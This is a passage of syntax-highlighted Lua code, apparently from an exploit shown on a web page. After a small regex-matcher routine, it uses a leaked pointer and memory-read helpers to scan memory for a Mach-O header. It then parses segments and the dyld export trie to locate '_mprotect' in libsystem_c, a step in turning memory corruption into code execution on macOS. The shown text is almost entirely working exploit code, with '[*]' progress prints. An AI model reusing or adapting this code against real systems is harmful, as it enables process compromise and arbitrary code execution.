</span><span class='line'>    <span class="kd">local</span> <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="o">#</span><span class="n">list</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">current</span><span class="p">,</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">list</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="n">current</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">dotstar</span><span class="p">()</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">any</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="n">ANY</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">alternation</span> <span class="o">=</span> <span class="p">{</span><span class="n">first_branch</span> <span class="o">=</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">second_branch</span> <span class="o">=</span> <span class="n">any</span><span class="p">,</span> <span class="n">byte</span> <span class="o">=</span> <span class="n">ALTERNATION</span><span class="p">}</span>
</span><span class='line'>  <span class="n">any</span><span class="p">.</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">alternation</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">alternation</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">join</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">right</span><span class="p">)</span>
</span><span class='line'>  <span class="n">left</span><span class="p">.</span><span class="n">first_branch</span> <span class="o">=</span> <span class="n">right</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">left</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">literal</span><span class="p">(</span><span class="n">literal</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="n">FINAL</span><span class="p">,</span> <span class="n">matched</span> <span class="o">=</span> <span class="n">literal</span><span class="p">}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=#</span><span class="n">literal</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">current</span> <span class="o">=</span> <span class="p">{</span><span class="n">byte</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">literal</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">first_branch</span> <span class="o">=</span> <span class="n">current</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">current</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">lastlist</span> <span class="o">~=</span> <span class="n">list_id</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">table.insert</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">)</span>
</span><span class='line'>    <span class="n">state</span><span class="p">.</span><span class="n">lastlist</span> <span class="o">=</span> <span class="n">list_id</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">ALTERNATION</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">first_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">second_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_restart</span><span class="p">(</span><span class="n">match_state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">current_list</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="n">addstate</span><span class="p">(</span><span class="n">current_list</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span><span class="p">,</span> <span class="n">current_list</span> <span class="o">=</span> <span class="n">current_list</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">re_restart</span><span class="p">({</span><span class="n">list_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">},</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="k">function</span> <span class="nf">re_push_byte</span><span class="p">(</span><span class="n">match_state</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">next_list</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="n">match_state</span><span class="p">.</span><span class="n">current_list</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">match_state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">byte</span> <span class="ow">or</span> <span class="n">state</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">ANY</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">addstate</span><span class="p">(</span><span class="n">next_list</span><span class="p">,</span> <span class="n">state</span><span class="p">.</span><span class="n">first_branch</span><span class="p">,</span> <span class="n">list_id</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">{</span><span class="n">list_id</span> <span class="o">=</span> <span class="n">list_id</span><span class="p">,</span> <span class="n">current_list</span> <span class="o">=</span> <span class="n">next_list</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">pagealign</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">byte2</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">aligned</span> <span class="o">=</span> <span class="nb">math.floor</span><span class="p">(</span><span class="n">byte2</span> <span class="o">/</span> <span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">16</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.char</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">aligned</span><span class="p">)</span> <span class="o">..</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">findmacho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">b8</span> <span class="o">=</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">target</span> <span class="o">=</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">page_size</span> <span class="o">=</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="kc">true</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">word</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">top_half</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">top_half</span> <span class="o">==</span> <span class="n">target</span> <span class="k">then</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">b8</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">b8</span> <span class="o">=</span> <span class="n">subb8</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">page_size</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">readi4</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">word</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">top_half</span> <span class="o">=</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">word</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">&lt;I4&quot;</span><span class="p">,</span> <span class="n">top_half</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">c_length</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">terminate_c_string</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">length</span> <span class="o">=</span> <span class="n">c_length</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">string.sub</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_segment</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_name</span> <span class="o">=</span> <span class="n">terminate_c_string</span><span class="p">(</span><span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="o">..</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">vm_addr</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">24</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">vm_size</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">file_offset</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found segment: &quot;</span> <span class="o">..</span> <span class="n">segment_name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> =&gt; &quot;</span> <span class="o">..</span> <span class="p">(</span><span class="n">dump8</span><span class="p">(</span><span class="n">vm_addr</span><span class="p">))</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s">/&quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">file_offset</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">segment_info</span><span class="p">[</span><span class="n">segment_name</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">vm_addr</span> <span class="o">=</span> <span class="n">vm_addr</span><span class="p">,</span> <span class="n">file_offset</span> <span class="o">=</span> <span class="n">file_offset</span><span class="p">,</span> <span class="n">vm_size</span> <span class="o">=</span> <span class="n">vm_size</span><span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_macho_segments</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">dyld_callback</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">commands</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">32</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_info</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">commands</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">command</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">))</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">size</span> <span class="o">=</span> <span class="n">readi4</span><span class="p">(</span><span class="n">addint</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">25</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">parse_segment</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="k">elseif</span> <span class="n">command</span> <span class="o">==</span> <span class="mi">2147483682</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">dyld_callback</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_info</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">parse_libsystem_c_macho</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">callback</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_info</span> <span class="o">=</span> <span class="n">parse_macho_segments</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">callback</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_info</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">segment_location</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="n">segment_name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">text_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">target_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="n">segment_name</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">segment_location</span> <span class="o">=</span> <span class="n">addb8</span><span class="p">(</span><span class="n">subb8</span><span class="p">(</span><span class="n">target_segment</span><span class="p">.</span><span class="n">vm_addr</span><span class="p">,</span> <span class="n">text_segment</span><span class="p">.</span><span class="n">vm_addr</span><span class="p">),</span> <span class="n">macho</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">segment_location</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">opcode_offset</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="n">lazy_binding_info_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">link_edit_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__LINKEDIT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">text_segment</span> <span class="o">=</span> <span class="n">segment_info</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">offset_into_link_edit</span> <span class="o">=</span> <span class="n">subb8</span><span class="p">(</span><span class="n">tob8</span><span class="p">(</span><span class="n">lazy_binding_info_offset</span><span class="p">),</span> <span class="n">link_edit_segment</span><span class="p">.</span><span class="n">file_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">link_edit_location</span> <span class="o">=</span> <span class="n">segment_location</span><span class="p">(</span><span class="n">macho</span><span class="p">,</span> <span class="n">segment_info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">__LINKEDIT&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">addb8</span><span class="p">(</span><span class="n">offset_into_link_edit</span><span class="p">,</span> <span class="n">link_edit_location</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">matches_part</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">label</span><span class="p">,</span> <span class="n">matched_so_far</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">label</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">-</span> <span class="n">matched_so_far</span> <span class="k">then</span>
</span><span class='line'>    <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">#</span><span class="n">label</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">label</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">~=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="n">matched_so_far</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">true</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_exported_symbol</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">matched_name</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">name_len</span> <span class="o">=</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">terminal_size</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">terminal_size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">name_len</span> <span class="o">==</span> <span class="n">matched_name</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">symbol_offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span> <span class="n">symbol_offset</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">lazy_stream_skip</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">terminal_size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">children</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="kd">local</span> <span class="n">matched</span> <span class="o">=</span> <span class="kc">false</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">children</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">label</span> <span class="o">=</span> <span class="n">read_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">node_offset</span> <span class="o">=</span> <span class="n">read_uleb8</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="n">matches_part</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">label</span><span class="p">,</span> <span class="n">matched_name</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>        <span class="n">matched_name</span> <span class="o">=</span> <span class="n">matched_name</span> <span class="o">+</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">label</span><span class="p">)</span>
</span><span class='line'>        <span class="n">lazy_stream_seek</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">node_offset</span><span class="p">)</span>
</span><span class='line'>        <span class="n">matched</span> <span class="o">=</span> <span class="kc">true</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">matched</span> <span class="k">then</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">process_export_bindings</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">macho_offset</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">mprotect</span> <span class="o">=</span> <span class="n">find_exported_symbol</span><span class="p">(</span><span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">size</span><span class="p">),</span> <span class="s2">&quot;</span><span class="s">_mprotect&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">mprotect</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
